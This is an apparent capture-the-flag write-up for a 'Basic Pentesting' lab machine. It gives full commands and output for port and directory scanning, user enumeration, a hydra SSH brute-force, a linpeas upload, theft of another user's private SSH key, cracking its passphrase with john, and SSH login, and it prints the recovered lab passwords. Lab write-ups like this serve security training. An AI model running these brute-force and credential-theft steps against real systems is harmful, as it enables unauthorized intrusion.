# Basic Pentesting

IP = 10.10.100.55


# Open ports (scanned with: nmap $IP)

	PORT     STATE SERVICE
	
	22/tcp   open  ssh
	80/tcp   open  http
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	8009/tcp open  ajp13
	8080/tcp open  http-proxy

# Scanning for hidden directories (scan made with: gobuster dir -w dir_list.txt -u http://$IP/)

	Hidden Directories -> /development

# Scanning for usernames (scan made with: enum4linux -a $IP)

	[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
	S-1-22-1-1000 Unix User\kay (Local User)
	S-1-22-1-1001 Unix User\jan (Local User)
	
	Usernames -> kay, jan 

# Getting password by brute-force (made with: hydra -l jan -P /opt/rockyou.txt ssh://$IP/)

	[DATA] attacking ssh://$IP:22/
		...
	[22][ssh] host: 10.10.100.55   login: jan   password: armando
	1 of 1 target successfully completed, 1 valid password found

# Accessing to machine gived the credentials by ssh protocol (ssh jan@$IP)

	>> ssh jan@$IP
	>> password: armando 

# Enumerating machine to find vectors for privilige escalation (made with: LinEnum.sh or linpeas.sh) 
 
	from my computer >> scp /opt/LinPEAS/linpeas.sh jan@$IP:/dev/shm/
			 >> password: armando
	
	from jan@basic2 >> chmod +x ./linpeas.sh
			>> ./linpeash.sh > log.txt

			Port 22
			PermitRootLogin prohibit-password
			PubkeyAuthentication yes
			PermitEmptyPasswords no
			ChallengeResponseAuthentication no
			UsePAM yes
			Possible private SSH keys were found!
			/home/kay/.ssh/id_rsa

 	> *It was a found an issue where we can look to the id_rsa private key for kay user* <
	> The id_rsa was copied and saved as kay_id_rsa into the Basic_Pentesting/ <

# Getting password by brute-force for kay_ssh

	>> python ssh2john kay_id_rsa > forjohn.txt
	>> john forjohn.txt --wordlist=/opt/rockyou.txt
	
		...
	beeswax          (kay_id_rsa)
	Warning: Only 1 candidate left, minimum 2 needed for performance.
	1g 0:00:00:05 DONE (2020-12-29 23:02) 0.1760g/s 2524Kp/s 2524Kc/s 2524KC/s *7Â¡Vamos!
	Session completed
	
	Password -> beeswax

# Login trough SSH protocol

	>> ssh -i kay_id_rsa kay@$IP
	>> Enter passphrase for key 'kay_id_rsa': beeswax
		
		...
	Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

# Getting last password for Basic Pentesting task

	>>cat pass.bak 
	heresareallystrongpasswordthatfollowsthepasswordpolicy$$


	
